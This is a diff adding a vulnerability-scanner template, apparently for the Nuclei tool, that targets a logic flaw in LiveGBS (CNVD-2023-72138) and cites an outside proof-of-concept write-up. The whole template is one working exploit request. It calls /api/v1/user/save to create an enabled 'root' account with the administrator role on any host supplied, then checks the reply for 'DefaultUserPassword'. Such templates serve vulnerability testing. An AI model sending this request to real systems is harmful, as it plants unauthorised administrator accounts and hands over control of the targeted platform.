@@ -1,0 +1,21 @@
+id: CNVD-2023-72138
+info:
+  name: LiveGBS存在逻辑缺陷漏洞
+  author: apple
+  severity: high
+  description: LiveGBS存在逻辑缺陷漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/LiveGBS%E5%AD%98%E5%9C%A8%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%BC%8F%E6%B4%9E(CNVD-2023-72138).md
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /api/v1/user/save?ID=&Username=root&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'DefaultUserPassword'
